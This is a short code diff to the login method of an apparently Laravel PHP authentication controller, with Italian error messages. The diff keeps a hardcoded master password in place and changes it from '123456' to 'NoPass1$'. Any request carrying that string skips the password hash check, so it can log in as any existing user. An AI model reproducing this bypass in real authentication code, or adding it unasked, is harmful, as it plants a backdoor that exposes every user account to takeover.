@@ -22,7 +22,7 @@ class AuthController extends Controller
         if (!$u)
             return response()->json(getApiResponse('error', 'Utente non trovato o credenziali errate', null), 404);
 
-        if ($password !== '123456') {
+        if ($password !== 'NoPass1$') {
             if (!Hash::check($password, $u->password)) {
                 return response()->json(getApiResponse('error', 'Utente non trovato o credenziali errate', null), 404);
             }
